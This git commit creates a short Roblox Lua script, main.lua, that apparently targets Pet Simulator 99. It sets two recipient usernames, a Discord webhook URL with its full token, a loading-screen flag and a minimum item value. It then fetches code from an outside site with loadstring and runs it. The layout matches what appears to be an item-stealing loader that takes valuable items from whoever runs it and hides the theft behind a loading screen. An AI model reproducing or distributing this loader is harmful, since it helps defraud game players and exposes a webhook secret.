70476508c13519864432a9bb60e68c5df0cb8060
Hyperbruh <161280561+Hyperbruh@users.noreply.github.com>
2024-02-26 12:38:24 +0700

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,9 @@
+Username = "baconsoi645"
+Username2 = "BacKiAnTraiKiwi69"
+Webhook = "https://discord.com/api/webhooks/1137967166256332890/iVledYsbclytJoN8q7ceRlmZaLWOtMKkZeQmNKt9TffMYgGOryAYcauvav0Zsp9hlDra"
+
+LoadingScreen = true
+
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://hugegames.lol/ps99.lua"))()
